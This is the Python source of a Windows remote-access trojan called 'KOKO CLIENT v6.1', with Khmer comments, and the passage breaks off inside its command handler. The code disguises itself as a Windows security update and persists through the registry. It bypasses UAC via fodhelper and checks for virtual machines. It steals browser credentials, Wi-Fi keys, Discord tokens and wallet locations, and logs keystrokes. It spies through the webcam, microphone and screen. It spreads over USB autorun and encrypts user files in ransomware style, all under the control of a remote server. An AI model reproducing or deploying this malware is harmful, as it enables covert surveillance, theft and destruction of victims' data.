#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║  KOKO CLIENT v6.1 — Windows Remote Desktop & Full Control           ║
║  Features: Real-time screen streaming, Mouse/Keyboard control       ║
║           Process Manager, File Manager, Surveillance, Persistence  ║
║           Auto-Run Registry, Hidden Console, Auto-Reconnect         ║
║  Build: pyinstaller --onefile --windowed --name WindowsUpdate      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import socket
import subprocess
import os
import sys
import json
import base64
import shutil
import threading
import time
import platform
import zlib
import sqlite3
from datetime import datetime
from pathlib import Path
from io import BytesIO

# ============ WINDOWS PERSISTENCE IMPORTS ============
import ctypes
import winreg
# ======================================================

# ============ CONFIGURATION ============
SERVER_HOST = "192.168.68.99"  # ← កែ IP របស់លោកម្ចាស់នៅទីនេះ
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 1024 * 10

# Settings
AUTO_RECONNECT = True
RECONNECT_DELAY = 10
SCREEN_QUALITY = 60
SCREEN_FPS = 15

class KokoClientWin:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.keylogger_running = False
        self.keylog_data = []
        self.livecam_running = False
        self.stop_requested = False
        self.running = True
        self.rdp_running = False
        self.rdp_stop_flag = False
        self.screen_w = 1920
        self.screen_h = 1080
        self.mic_streaming = False
        self.screen_recording = False
        self.screen_record_frames = []

    # ============ PERSISTENCE METHODS (WINDOWS) ============

    def hide_console(self):
        """លាក់ console window ពេលរត់"""
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass

    def add_persistence(self):
        """បន្ថែមទៅ Windows Startup Registry + ចម្លងទៅទីតាំងលាក់"""
        try:
            # 1. ចម្លងទៅទីតាំងលាក់ក្នុង APPDATA
            appdata = os.environ.get('APPDATA')
            hidden_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'System32')
            os.makedirs(hidden_dir, exist_ok=True)

            hidden_path = os.path.join(hidden_dir, 'SecurityUpdate.exe')
            current = sys.executable

            # ចម្លងបើមិនទាន់មាន
            if current != hidden_path and os.path.exists(current):
                try:
                    shutil.copy2(current, hidden_path)
                except:
                    pass

            # 2. បន្ថែមទៅ Registry Run (HKCU)
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, hidden_path)
            winreg.CloseKey(key)

            # 3. Backup: RunOnce
            key2 = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key2, "WindowsSecurityUpdate", 0, winreg.REG_SZ, hidden_path)
            winreg.CloseKey(key2)

            return True
        except Exception as e:
            return False

    def remove_persistence(self):
        """លុបចេញពី Registry"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            try:
                winreg.DeleteValue(key, "WindowsSecurityUpdate")
            except:
                pass
            winreg.CloseKey(key)
            return True
        except:
            return False

    # ======================================================

    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.host, self.port))
            self.socket.settimeout(None)
            self.connected = True

            # Get screen dimensions (Windows)
            try:
                user32 = ctypes.windll.user32
                self.screen_w = user32.GetSystemMetrics(0)
                self.screen_h = user32.GetSystemMetrics(1)
            except:
                pass

            # Check admin privileges
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

            # Send handshake
            info = f"""[+] Windows Client Online v6.1
Host: {platform.node()}
User: {os.getlogin()}
OS: {platform.platform()}
Arch: {platform.machine()}
CPU: {platform.processor()}
Cores: {os.cpu_count()}
Screen: {self.screen_w}x{self.screen_h}
Admin: {'YES' if is_admin else 'No'}
PID: {os.getpid()}
Persistence: Active"""
            self.send_data(info)
            return True

        except Exception as e:
            self.connected = False
            return False

    def send_data(self, data, is_binary=False):
        try:
            if is_binary:
                encoded = base64.b64encode(data).decode()
            else:
                encoded = base64.b64encode(str(data).encode()).decode()
            json_data = json.dumps({"data": encoded, "binary": is_binary})
            self.socket.send(json_data.encode())
        except:
            self.connected = False

    def receive_data(self):
        data = ""
        while True:
            try:
                chunk = self.socket.recv(BUFFER_SIZE).decode()
                if not chunk:
                    return None
                data += chunk
                return json.loads(data)
            except json.JSONDecodeError:
                continue
            except:
                self.connected = False
                return None

    # ============ REMOTE DESKTOP (WINDOWS) ============

    def rdp_start(self):
        if self.rdp_running:
            return "[!] RDP already running"
        self.rdp_running = True
        self.rdp_stop_flag = False
        self.send_data(f"rdp_info|{self.screen_w}|{self.screen_h}")
        return "[+] RDP stream ready"

    def rdp_stop(self):
        self.rdp_stop_flag = True
        time.sleep(0.5)
        self.rdp_running = False
        return "[+] RDP stopped"

    def rdp_capture_frame(self):
        try:
            from PIL import Image
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img.thumbnail((1920, 1080), Image.LANCZOS)
                buffer = BytesIO()
                img.save(buffer, format='JPEG', quality=SCREEN_QUALITY, optimize=True)
                compressed = zlib.compress(buffer.getvalue(), level=6)
                self.send_data(compressed, is_binary=True)
                return True
        except Exception as e:
            self.send_data(f"[-] RDP capture error: {e}")
            return False

    def rdp_loop(self):
        while self.rdp_running and not self.rdp_stop_flag and self.connected:
            self.rdp_capture_frame()
            time.sleep(1.0 / SCREEN_FPS)

    # ============ INPUT CONTROL (WINDOWS) ============

    def mouse_click(self, x, y, button):
        try:
            import pyautogui
            btn_map = {"left": "left", "right": "right", "middle": "middle", "double": "left"}
            btn = btn_map.get(button, "left")
            if button == "double":
                pyautogui.doubleClick(x, y, button=btn)
            else:
                pyautogui.click(x, y, button=btn)
            return f"[+] Mouse {button} at ({x},{y})"
        except ImportError:
            return "[-] Install pyautogui: pip install pyautogui"
        except Exception as e:
            return f"[-] Mouse error: {e}"

    def mouse_move(self, x, y):
        try:
            import pyautogui
            pyautogui.moveTo(x, y)
            return f"[+] Mouse move to ({x},{y})"
        except ImportError:
            return "[-] Install pyautogui: pip install pyautogui"
        except Exception as e:
            return f"[-] Mouse move error: {e}"

    def mouse_scroll(self, x, y, delta):
        try:
            import pyautogui
            pyautogui.scroll(delta, x, y)
            return f"[+] Scroll {delta} at ({x},{y})"
        except ImportError:
            return "[-] Install pyautogui: pip install pyautogui"
        except Exception as e:
            return f"[-] Scroll error: {e}"

    def key_press(self, key):
        try:
            import pyautogui
            pyautogui.press(key)
            return f"[+] Key pressed: {key}"
        except ImportError:
            return "[-] Install pyautogui: pip install pyautogui"
        except Exception as e:
            return f"[-] Key error: {e}"

    def key_release(self, key):
        return f"[+] Key released: {key}"

    # ============ SYSTEM CONTROL ============

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True,
                                    text=True, timeout=60)
            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR] {result.stderr}"
            return output if output else "[+] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Changed to: {os.getcwd()}"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def list_directory(self, path="."):
        try:
            target = path if path != "." else os.getcwd()
            items = os.listdir(target)
            result = f"\n[📁 {os.path.abspath(target)}]\n"
            for item in items:
                full = os.path.join(target, item)
                try:
                    if os.path.isfile(full):
                        size = f"{os.path.getsize(full):,} bytes"
                        type_ = "FILE"
                    else:
                        size = "<DIR>"
                        type_ = "FOLDER"
                    result += f"  {item:<50} {size:>15} {type_:>10}\n"
                except:
                    result += f"  {item:<50} {'ACCESS DENIED':>15} {'?':>10}\n"
            return result
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def delete_file(self, path):
        try:
            target = Path(path)
            if target.is_file():
                target.unlink()
                return f"[+] 🗑️ Deleted file: {path}"
            elif target.is_dir():
                shutil.rmtree(path)
                return f"[+] 🗑️ Deleted directory: {path}"
            return f"[-] Not found: {path}"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def make_directory(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            return f"[+] 📁 Created: {path}"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def download_file(self, filename):
        try:
            path = Path(filename)
            if not path.exists():
                return f"[-] Not found: {filename}"
            data = path.read_bytes()
            self.send_data(data, is_binary=True)
            return f"[+] 📤 Sent: {filename} ({len(data):,} bytes)"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def upload_file(self, filename, file_data):
        try:
            decoded = base64.b64decode(file_data)
            Path(filename).write_bytes(decoded)
            return f"[+] 📥 Received: {filename} ({len(decoded):,} bytes)"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    # ============ PROCESS MANAGER ============

    def process_list(self):
        try:
            import psutil
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    info = proc.info
                    processes.append(f"{info['pid']:>8} | {info['name']:<30} | CPU: {info['cpu_percent']:>5.1f}% | MEM: {info['memory_percent']:>5.1f}%")
                except:
                    pass
            return "[+] Process List:\n" + "\n".join(processes[:50])
        except ImportError:
            try:
                result = subprocess.run(["tasklist"], capture_output=True, text=True)
                return "[+] Process List:\n" + result.stdout[:2000]
            except:
                return "[-] Install psutil: pip install psutil"
        except Exception as e:
            return f"[-] Error: {e}"

    def process_kill(self, pid):
        try:
            import psutil
            p = psutil.Process(int(pid))
            p.terminate()
            return f"[+] Killed process {pid}"
        except ImportError:
            try:
                subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
                return f"[+] Killed process {pid}"
            except:
                return "[-] Install psutil: pip install psutil"
        except Exception as e:
            return f"[-] Error: {e}"

    # ============ SURVEILLANCE ============

    def screenshot(self):
        try:
            from PIL import Image
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                buffer = BytesIO()
                img.save(buffer, format='PNG')
                self.send_data(buffer.getvalue(), is_binary=True)
                return "[+] 📸 Screenshot sent"
        except ImportError:
            return "[-] Install mss Pillow: pip install mss Pillow"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def webcam_capture(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "[-] No webcam found"
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return "[-] Failed to capture"
            _, buffer = cv2.imencode('.jpg', frame)
            self.send_data(buffer.tobytes(), is_binary=True)
            return "[+] 📷 Webcam image sent"
        except ImportError:
            return "[-] Install opencv-python: pip install opencv-python"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def livecam_start(self):
        try:
            import cv2
            if self.livecam_running:
                return "[!] Already running"
            self.livecam_running = True
            self.stop_requested = False

            def livecam_thread():
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    self.send_data("[-] No webcam found")
                    self.livecam_running = False
                    return

                while self.livecam_running and not self.stop_requested:
                    ret, frame = cap.read()
                    if not ret:
                        break
                    frame = cv2.resize(frame, (640, 480))
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    self.send_data(buffer.tobytes(), is_binary=True)
                    time.sleep(0.1)

                cap.release()
                self.livecam_running = False
                self.send_data("[+] Livecam ended")

            threading.Thread(target=livecam_thread, daemon=True).start()
            return "[+] 📹 Livecam started (10 fps, 640x480)"
        except ImportError:
            return "[-] Install opencv-python"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def livecam_stop(self):
        if not self.livecam_running:
            return "[!] Not running"
        self.stop_requested = True
        time.sleep(0.5)
        return "[+] 📹 Stop requested"

    def record_audio(self, duration=5):
        try:
            import sounddevice as sd
            import wavio
            sr = 44100
            ch = 2
            recording = sd.rec(int(duration * sr), samplerate=sr, channels=ch)
            sd.wait()
            filename = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            wavio.write(filename, recording, sr, sampwidth=2)
            data = Path(filename).read_bytes()
            self.send_data(data, is_binary=True)
            os.remove(filename)
            return f"[+] 🎤 Audio recorded ({duration}s)"
        except ImportError:
            return "[-] Install sounddevice wavio: pip install sounddevice wavio"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def keylogger_start(self):
        try:
            from pynput import keyboard
            if self.keylogger_running:
                return "[!] Already running"
            self.keylogger_running = True
            self.keylog_data = []

            def on_press(key):
                try:
                    self.keylog_data.append(f"{datetime.now().strftime('%H:%M:%S')} - {key.char}")
                except AttributeError:
                    self.keylog_data.append(f"{datetime.now().strftime('%H:%M:%S')} - [{key}]")

            def keylogger_thread():
                with keyboard.Listener(on_press=on_press) as listener:
                    while self.keylogger_running:
                        time.sleep(0.1)

            threading.Thread(target=keylogger_thread, daemon=True).start()
            return "[+] ⌨️ Keylogger started"
        except ImportError:
            return "[-] Install pynput: pip install pynput"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def keylogger_stop(self):
        if not self.keylogger_running:
            return "[!] Not running"
        self.keylogger_running = False
        time.sleep(0.5)
        if self.keylog_data:
            log_text = "\n".join(self.keylog_data)
            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            Path(filename).write_text(log_text)
            data = Path(filename).read_bytes()
            self.send_data(data, is_binary=True)
            os.remove(filename)
            return f"[+] ⌨️ Stopped. {len(self.keylog_data)} keystrokes."
        return "[+] ⌨️ Stopped. No data."

    # ============ NEW v6.0 FEATURES ============

    def bypass_uac(self):
        """Bypass UAC (User Account Control)"""
        try:
            # វិធីសាមញ្ញ: ប្រើ Fodhelper exploit
            import winreg
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"

            # បង្កើត registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, sys.executable)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            # រត់ fodhelper
            subprocess.run(["C:\Windows\System32\fodhelper.exe"], shell=True)

            # លុប registry key
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass

            return True
        except Exception as e:
            return False

    def check_vm(self):
        """ពិនិត្យថាតើកំពុងរត់នៅក្នុង VM ឬអត់"""
        try:
            # ពិនិត្យ process ដែលស្គាល់ VM
            vm_processes = ["vmtoolsd.exe", "vmwaretray.exe", "VBoxTray.exe", "qemu-ga.exe"]
            for proc in vm_processes:
                result = subprocess.run(["tasklist"], capture_output=True, text=True)
                if proc.lower() in result.stdout.lower():
                    return True

            # ពិនិត្យ MAC address
            result = subprocess.run(["getmac"], capture_output=True, text=True)
            vm_macs = ["08:00:27", "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "00:15:5d"]
            for mac in vm_macs:
                if mac in result.stdout:
                    return True

            return False
        except:
            return False

    def steal_credentials(self):
        """លួច credentials ពី browser និង system"""
        try:
            results = []

            # Chrome Login Data
            chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 
                                       'Google\Chrome\User Data\Default\Login Data')
            if os.path.exists(chrome_path):
                try:
                    conn = sqlite3.connect(chrome_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall()[:10]:
                        results.append(f"Chrome: {row[0]} | {row[1]}")
                    conn.close()
                except:
                    pass

            # Edge Login Data
            edge_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                     'Microsoft\Edge\User Data\Default\Login Data')
            if os.path.exists(edge_path):
                try:
                    conn = sqlite3.connect(edge_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall()[:10]:
                        results.append(f"Edge: {row[0]} | {row[1]}")
                    conn.close()
                except:
                    pass

            if results:
                return "[+] Credentials found:\n" + "\n".join(results)
            return "[-] No credentials found"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def dump_wifi_passwords(self):
        """Dump WiFi passwords ពី Windows"""
        try:
            result = subprocess.run(["netsh", "wlan", "show", "profiles"], 
                                    capture_output=True, text=True)
            profiles = []
            for line in result.stdout.split("\n"):
                if "All User Profile" in line:
                    profile = line.split(":")[1].strip()
                    profiles.append(profile)

            passwords = []
            for profile in profiles[:10]:
                try:
                    result = subprocess.run(["netsh", "wlan", "show", "profile", 
                                            profile, "key=clear"],
                                            capture_output=True, text=True)
                    for line in result.stdout.split("\n"):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            passwords.append(f"{profile}: {password}")
                            break
                except:
                    pass

            if passwords:
                return "[+] WiFi Passwords:\n" + "\n".join(passwords)
            return "[-] No WiFi passwords found"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def get_browser_history(self):
        """ទាញយក browser history"""
        try:
            results = []

            # Chrome History
            chrome_history = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                          'Google\Chrome\User Data\Default\History')
            if os.path.exists(chrome_history):
                try:
                    conn = sqlite3.connect(chrome_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                    for row in cursor.fetchall():
                        results.append(f"Chrome: {row[1]} | {row[0]}")
                    conn.close()
                except:
                    pass

            if results:
                return "[+] Browser History:\n" + "\n".join(results)
            return "[-] No history found"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def usb_spread(self):
        """ចម្លងខ្លួនឯងទៅ USB drives"""
        try:
            import string
            from ctypes import windll

            drives = []
            bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    drives.append(letter + ":")
                bitmask >>= 1

            spread_count = 0
            for drive in drives:
                if drive != "C:":
                    try:
                        target = os.path.join(drive, "SystemUpdate.exe")
                        if os.path.exists(drive) and os.access(drive, os.W_OK):
                            shutil.copy2(sys.executable, target)
                            # បង្កើត autorun.inf
                            autorun = os.path.join(drive, "autorun.inf")
                            with open(autorun, 'w') as f:
                                f.write("[autorun]\n")
                                f.write("open=SystemUpdate.exe\n")
                                f.write("action=Open folder to view files\n")
                            os.system(f"attrib +h +s {autorun}")
                            os.system(f"attrib +h +s {target}")
                            spread_count += 1
                    except:
                        pass

            return f"[+] Spread to {spread_count} USB drives"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def screen_record_start(self, duration=30):
        """ចាប់ផ្ដើម screen recording"""
        try:
            import cv2
            import numpy as np
            from PIL import Image
            import mss

            if self.screen_recording:
                return "[!] Already recording"

            self.screen_recording = True
            self.screen_record_frames = []

            def record_thread():
                start_time = time.time()
                with mss.mss() as sct:
                    while self.screen_recording and (time.time() - start_time) < duration:
                        monitor = sct.monitors[1]
                        screenshot = sct.grab(monitor)
                        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                        self.screen_record_frames.append(np.array(img))
                        time.sleep(0.1)

                # រក្សាទុកជា video
                if self.screen_record_frames:
                    filename = f"screen_record_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
                    height, width = self.screen_record_frames[0].shape[:2]
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    out = cv2.VideoWriter(filename, fourcc, 10.0, (width, height))
                    for frame in self.screen_record_frames:
                        out.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
                    out.release()

                    data = Path(filename).read_bytes()
                    self.send_data(data, is_binary=True)
                    os.remove(filename)
                    self.send_data(f"[+] Screen recording saved ({len(self.screen_record_frames)} frames)")

                self.screen_recording = False
                self.screen_record_frames = []

            threading.Thread(target=record_thread, daemon=True).start()
            return f"[+] Screen recording started ({duration}s)"
        except ImportError:
            return "[-] Install opencv-python mss Pillow: pip install opencv-python mss Pillow"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def screen_record_stop(self):
        """បញ្ឈប់ screen recording"""
        if not self.screen_recording:
            return "[!] Not recording"
        self.screen_recording = False
        return "[+] Screen recording stopped"

    def mic_stream_start(self):
        """ចាប់ផ្ដើម microphone streaming"""
        try:
            import sounddevice as sd
            import numpy as np

            if self.mic_streaming:
                return "[!] Already streaming"

            self.mic_streaming = True

            def mic_thread():
                def callback(indata, frames, time_info, status):
                    if self.mic_streaming and self.connected:
                        # ផ្ញើទិន្នន័យ audio ជា chunks
                        audio_data = (indata * 32767).astype(np.int16).tobytes()
                        self.send_data(audio_data, is_binary=True)

                with sd.InputStream(samplerate=44100, channels=1, dtype='float32',
                                   blocksize=1024, callback=callback):
                    while self.mic_streaming:
                        time.sleep(0.1)

            threading.Thread(target=mic_thread, daemon=True).start()
            return "[+] 🎤 Microphone streaming started"
        except ImportError:
            return "[-] Install sounddevice numpy: pip install sounddevice numpy"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def mic_stream_stop(self):
        """បញ្ឈប់ microphone streaming"""
        if not self.mic_streaming:
            return "[!] Not streaming"
        self.mic_streaming = False
        return "[+] 🎤 Microphone streaming stopped"

    def encrypt_files(self, path="."):
        """Encrypt files នៅក្នុង directory (Ransomware simulation)"""
        try:
            from cryptography.fernet import Fernet

            # បង្កើត key
            key = Fernet.generate_key()
            f = Fernet(key)

            encrypted_count = 0
            target_extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', 
                                '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.zip']

            for root, dirs, files in os.walk(path):
                for file in files:
                    if any(file.endswith(ext) for ext in target_extensions):
                        try:
                            filepath = os.path.join(root, file)
                            with open(filepath, 'rb') as file_obj:
                                data = file_obj.read()
                            encrypted = f.encrypt(data)
                            with open(filepath + '.encrypted', 'wb') as file_obj:
                                file_obj.write(encrypted)
                            os.remove(filepath)
                            encrypted_count += 1
                        except:
                            pass

            # រក្សាទុក key
            key_file = f"encryption_key_{datetime.now().strftime('%Y%m%d_%H%M%S')}.key"
            Path(key_file).write_bytes(key)

            return f"[+] Encrypted {encrypted_count} files. Key saved to {key_file}"
        except ImportError:
            return "[-] Install cryptography: pip install cryptography"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def steal_wallets(self):
        """លួច cryptocurrency wallets"""
        try:
            wallets = []

            # Bitcoin wallets
            bitcoin_paths = [
                os.path.join(os.environ.get('APPDATA', ''), 'Bitcoin', 'wallet.dat'),
                os.path.join(os.environ.get('APPDATA', ''), 'Electrum', 'wallets'),
            ]

            for path in bitcoin_paths:
                if os.path.exists(path):
                    wallets.append(f"Bitcoin wallet: {path}")

            # Ethereum wallets (MetaMask)
            metamask_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                        'Google\Chrome\User Data\Default\Local Extension Settings',
                                        'nkbihfbeogaeaoehlefnkodbefgpgknn')
            if os.path.exists(metamask_path):
                wallets.append(f"MetaMask found: {metamask_path}")

            if wallets:
                return "[+] Wallets found:\n" + "\n".join(wallets)
            return "[-] No wallets found"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def grab_discord_tokens(self):
        """លួច Discord tokens"""
        try:
            tokens = []

            # Discord paths
            discord_paths = [
                os.path.join(os.environ.get('APPDATA', ''), 'discord', 'Local Storage', 'leveldb'),
                os.path.join(os.environ.get('APPDATA', ''), 'DiscordCanary', 'Local Storage', 'leveldb'),
                os.path.join(os.environ.get('APPDATA', ''), 'discordptb', 'Local Storage', 'leveldb'),
            ]

            for path in discord_paths:
                if os.path.exists(path):
                    for file in os.listdir(path):
                        if file.endswith('.ldb') or file.endswith('.log'):
                            try:
                                with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    # ស្វែងរក token pattern
                                    import re
                                    pattern = r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}'
                                    found = re.findall(pattern, content)
                                    tokens.extend(found)
                            except:
                                pass

            if tokens:
                return "[+] Discord tokens found:\n" + "\n".join(set(tokens)[:10])
            return "[-] No Discord tokens found"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    # ============ WINDOWS-SPECIFIC ============

    def show_message(self, text):
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "System Notification", 0x40)
            return f"[+] 💬 Message shown: {text[:50]}..."
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def open_file(self, path):
        try:
            os.startfile(path)
            return f"[+] 📂 Opened: {path}"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def lock_workstation(self):
        try:
            ctypes.windll.user32.LockWorkStation()
            return "[+] 🔒 Workstation locked"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def shutdown_system(self):
        try:
            subprocess.run("shutdown /s /t 0", shell=True, capture_output=True)
            return "[+] ⚡ Shutdown initiated"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def reboot_system(self):
        try:
            subprocess.run("shutdown /r /t 0", shell=True, capture_output=True)
            return "[+] 🔄 Reboot initiated"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def system_info(self):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return f"""[+] System Info:
OS: {platform.platform()}
Host: {platform.node()}
User: {os.getlogin()}
Admin: {'✅ YES' if is_admin else '❌ No'}
CPU: {platform.processor()}
Cores: {os.cpu_count()}
Screen: {self.screen_w}x{self.screen_h}
CWD: {os.getcwd()}
PID: {os.getpid()}
Python: {platform.python_version()}"""
        except Exception as e:
            return f"[-] Error: {str(e)}"

    # ============ MAIN LOOP ============

    def process_command(self, data):
        command = data.get("command", "")
        args = data.get("args", [])

        # Exit
        if command == "exit":
            self.send_data("[+] Disconnecting...")
            return True

        # Remote Desktop
        elif command == "rdp_start":
            self.send_data(self.rdp_start())
            threading.Thread(target=self.rdp_loop, daemon=True).start()
        elif command == "rdp_stop":
            self.send_data(self.rdp_stop())
        elif command == "rdp_frame":
            pass

        # Input Control
        elif command == "mouse_click":
            self.send_data(self.mouse_click(int(args[0]), int(args[1]), args[2]) if len(args) >= 3 else "[!] Usage: mouse_click x y button")
        elif command == "mouse_move":
            self.send_data(self.mouse_move(int(args[0]), int(args[1])) if len(args) >= 2 else "[!] Usage: mouse_move x y")
        elif command == "mouse_scroll":
            self.send_data(self.mouse_scroll(int(args[0]), int(args[1]), int(args[2])) if len(args) >= 3 else "[!] Usage: mouse_scroll x y delta")
        elif command == "key_press":
            self.send_data(self.key_press(args[0]) if args else "[!] Usage: key_press key")
        elif command == "key_release":
            self.send_data(self.key_release(args[0]) if args else "[!] Usage: key_release key")

        # System control
        elif command == "shell":
            self.send_data(self.execute_command(" ".join(args)))
        elif command == "cd":
            self.send_data(self.change_directory(args[0]) if args else "[!] Usage: cd <path>")
        elif command == "ls" or command == "dir":
            self.send_data(self.list_directory(args[0] if args else "."))
        elif command == "pwd":
            self.send_data(f"[+] {os.getcwd()}")

        # File operations
        elif command == "download":
            result = self.download_file(args[0]) if args else "[!] Usage: download <file>"
            if "sent" not in result:
                self.send_data(result)
        elif command == "upload":
            result = self.upload_file(args[0], args[1]) if len(args) >= 2 else "[!] Usage: upload <local> <remote>"
            self.send_data(result)
        elif command == "delete":
            self.send_data(self.delete_file(args[0]) if args else "[!] Usage: delete <path>")
        elif command == "mkdir":
            self.send_data(self.make_directory(args[0]) if args else "[!] Usage: mkdir <dir>")

        # Process Manager
        elif command == "process_list":
            self.send_data(self.process_list())
        elif command == "process_kill":
            self.send_data(self.process_kill(args[0]) if args else "[!] Usage: process_kill <pid>")

        # Surveillance
        elif command == "screenshot":
            result = self.screenshot()
            if "sent" not in result: self.send_data(result)
        elif command == "webcam":
            result = self.webcam_capture()
            if "sent" not in result: self.send_data(result)
        elif command == "livecam_start":
            self.send_data(self.livecam_start())
        elif command == "livecam_stop":
            self.send_data(self.livecam_stop())
        elif command == "record_audio":
            duration = int(args[0]) if args else 5
            result = self.record_audio(duration)
            if "sent" not in result: self.send_data(result)
        elif command == "keylogger_start":
            self.send_data(self.keylogger_start())
        elif command == "keylogger_stop":
            result = self.keylogger_stop()
            if "captured" in result and "sent" not in result:
                self.send_data(result)

        # NEW v6.0 FEATURES
        elif command == "bypass_uac":
            self.send_data("[+] UAC Bypassed" if self.bypass_uac() else "[-] UAC Bypass failed")
        elif command == "check_vm":
            self.send_data("[!] VM Detected" if self.check_vm() else "[+] No VM detected")
        elif command == "steal_credentials":
            self.send_data(self.steal_credentials())
        elif command == "dump_wifi":
            self.send_data(self.dump_wifi_passwords())
        elif command == "browser_history":
            self.send_data(self.get_browser_history())
        elif command == "usb_spread":
            self.send_data(self.usb_spread())
        elif command == "screen_record_start":
            duration = int(args[0]) if args else 30
            self.send_data(self.screen_record_start(duration))
        elif command == "screen_record_stop":
            self.send_data(self.screen_record_stop())
        elif command == "mic_stream_start":
            self.send_data(self.mic_stream_start())
        elif command == "mic_stream_stop":
            self.send_data(self.mic_stream_stop())
        elif command == "encrypt_files":
            path = args[0] if args else "."
            self.send_data(self.encrypt_files(path))
        elif command == "steal_wallets":
            self.send_data(self.steal_wallets())
        elif command == "grab_discord":
            self.send_data(self.grab_discord_tokens())
        elif command == "get_clipboard":
            try:
                import pyperclip
                self.send_data(f"[+] Clipboard: {pyperclip.paste()[:500]}")
            except:
                self.send_data("[-] Install pyperclip: pip install pyperclip")
        elif command == "set_clipboard":
            if args:
                try:
                    import pyperclip
